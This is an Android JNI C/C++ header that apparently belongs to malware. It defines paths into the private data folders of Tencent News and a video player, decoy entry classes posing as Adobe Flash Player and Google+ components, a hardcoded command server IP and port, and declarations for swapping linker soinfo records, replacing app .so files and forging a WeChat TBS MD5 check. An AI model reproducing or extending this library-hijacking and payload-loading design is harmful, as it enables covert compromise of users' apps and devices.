
#ifndef PUBLIC_H_H_H
#define PUBLIC_H_H_H
#include <jni.h>
#include <limits.h>
#include <elf.h>



#include <android/log.h>
#include <dlfcn.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>

using namespace std;

//#define DEBUG

//#define GXT_MODE
#define MYSELFTEST_MODE





//#define TVKLIB_PATH 				"/data/data/com.tencent.mobileqq/files/TencentVideoKit/armeabi/"
//#define TVKLIB_UPDATE_PATH 			"/data/data/com.tencent.mobileqq/files/TencentVideoKitUpdate/armeabi/"
//#define QQNEWS_CACHE_PATH 			"/data/data/com.tencent.news/cache/"
#define QQNEWS_APPVIDEOSO_PATH 		"/data/data/com.tencent.news/app_video_so/"
#define STORMPLAYER_SO_CACHE_PATH 	"/data/data/com.storm.smart/cache/"
//#define STORMPLAYER_SO_FILES_PATH 	"/data/data/com.storm.smart/files/"


#ifdef MYSELFTEST_MODE
#define JAR_FILE_NAME 			"simcard.apk"
#define ENTRANCE_CLASSNAME 		"com.adobe.flashplayer.SoEntry"
#define NEWSO_FILE_NAME			"new.so"
#define OLDSO_FILE_NAME			"old.so"
#define CONFIG_FILE_NAME		"ark.dat"
#define SERVER_IP_ADDRESS		"47.91.251.130"
#define SERVER_PORT				2002
#elif defined(GXT_MODE)
//#define DATAJAR_FILE_NAME 	"qqsdl.dat"
#define JAR_FILE_NAME 			"qqsdl.apk"
#define CONFIG_FILE_NAME		"ark.dat"
#define NEWSO_FILE_NAME			"new.so"
#define OLDSO_FILE_NAME			"fuckTencent.so"
#define ENTRANCE_CLASSNAME 		"com.google.android.apps.plus.SoEntry"
#else
#define ENTRANCE_CLASSNAME 		"com.android.build.autoCheck.AndroidSetActivity"
#endif

#define ENTRANCE_METHODNAME 	"start"
#define LOG_FILE_NAME 			"/sdcard/runningLog.txt"
#define TRUE 					1
#define FALSE 					0
#define DEFAULT_JNI_VERSION 	JNI_VERSION_1_4
#define COMBINED_SOFILENAME_LEN 16

#pragma pack(1)

typedef struct{
	int filesize;
	char szfilename[COMBINED_SOFILENAME_LEN];
}COMBINED_SOFILE_HEADER,*LPCOMBINED_SOFILE_HEADER;


#define READFILE_LINESIZE 4096

#define SOINFO_NAME_LEN 128

#define SHT_ARM_EXIDEX 0x70000001
#define SHF_LINKORDER 0x80
#define SHT_FINI_ARRAY 15
#define SHT_INIT_ARRAY 14
#define PT_ARM_EXIDEX 0x70000001

#define ANDROID_ARM_LINKER

//extern int gLoadedOK ;


typedef unsigned int __uintptr_t;
typedef __uintptr_t   uintptr_t;

struct link_map
{
    uintptr_t l_addr;
    char * l_name;
    uintptr_t l_ld;
    struct link_map * l_next;
    struct link_map * l_prev;
};

typedef struct __soinfo{
	char name[SOINFO_NAME_LEN];       	/* so库文件的文件路径 */
	const Elf32_Phdr *phdr;           	/* 指向程序段头表 */
	int phnum;						   	/* 程序段头表的数量 */
	unsigned entry;				   		/* so库文件的代码执行入口地址 */
	unsigned base;					   	/* so库文件内存加载后的基地址 */
	unsigned size;                    	/* so库文件所有可加载段的长度 */
	int unused;  						// DO NOT USE, maintained for compatibility.
	unsigned *dynamic;				   	/* .dynamic段描述结构体所在的起始地址*/
	unsigned unused2; 					// DO NOT USE, maintained for compatibility
	unsigned unused3; 					// DO NOT USE, maintained for compatibility
	__soinfo *next;
	unsigned flags;
	const char *strtab;               	/* .strtab段所在的内存地址 */
	Elf32_Sym *symtab;				   	/* .symtab段所在的内存地址 */
	unsigned nbucket;
	unsigned nchain;
	unsigned *bucket;
	unsigned *chain;
	unsigned *plt_got;
	Elf32_Rel *plt_rel;
	unsigned plt_rel_count;
	Elf32_Rel *rel;
	unsigned rel_count;
	unsigned *preinit_array;
	unsigned preinit_array_count;
	unsigned *init_array;
	unsigned init_array_count;
	unsigned *fini_array;
	unsigned fini_array_count;
	void (*init_func)(void);
	void (*fini_func)(void);

	#if defined(ANDROID_ARM_LINKER)
	/* ARM EABI section used for stack unwinding. */
	unsigned *ARM_exidx;
	unsigned ARM_exidx_count;
	#elif defined(ANDROID_MIPS_LINKER)
	#if 0     /* not yet */
	unsigned *mips_pltgot
	#endif
	unsigned mips_symtabno;
	unsigned mips_local_gotno;
	unsigned mips_gotsym;
	#endif

	/* ANDROID_*_LINKER */
	unsigned refcount;
	struct link_map linkmap;
	int constructors_called;                   	/* 构造函数已经被调用 */
	/* When you read a virtual address from the ELF file, add this
	 * value to get the corresponding address in the process' address space */
	Elf32_Addr load_bias;
	int has_text_relocations; 					/* 表明是否是从主程序中调用 */
	//int loader_is_main;
	bool has_DT_SYMBOLIC;
}soinfo;

int readFile4096(char * filename,char ** data,int * fs);
int createFile(char * fn);
int writeNewFile(char * filename,char * data,int size);
int appendFile(char * filename,char * data,int size);

int replaceSoInfo_new(soinfo * srcso,soinfo * dstso);
int replaceSoInfo(soinfo * srcso,soinfo * dstso);
int replaceSoInfo(const char * srcsoname,const char * dstsoname,soinfo * keepsoinfo);

int getFileMD5(const char * fn,const char *szmd5);

int androidCopyFile(char * srcfn,char * dstfn);

int splitFromSo(char * fpath,char * dstpath,char * fname);
int writeLogFile(const char * log,const char * szCmdline);
int writeLogFile(const char * log);
extern "C" int Jstring2char(JNIEnv * env,jstring jstr,char * lpbyte,int bytelen);
extern "C" jstring char2Jstring(JNIEnv * env,const char* pat,int patlen);
//extern "C" int getPackageName(JNIEnv *env, char *packname,int len );
extern "C" jobject getGlobalContext(JNIEnv *env);
extern "C" int GetPackageName(JNIEnv *env, jobject obj,char * packname,int len);
extern "C" string getPackageName();

extern "C" int getAndroidVersion();

int getString(char * src,char * hdr,char * end,char * dst,int mode);

int getPacknameInProcname(char * procname,char * packname);

int getPathNameFromFullPath(char * fullpath,char * path,char * name);

int modifyWexinTbsMd5(const char * szfn,const char * lpname,const char * szvalue,int len,int flag);

unsigned short __ntohs(unsigned short port);
unsigned int __ntohl(unsigned int v);

extern "C" JNIEnv* dlsmgetenv();

extern "C" int getSoPath(char * fn,char * path,char * name,char * value);

#define __htonl __ntohl
#define __htons __ntohs

//bool isxdigit(char c);

//int GetJarFromSocket(char * szjarpath);

//int GetCmdline(char * cmdline);
#endif
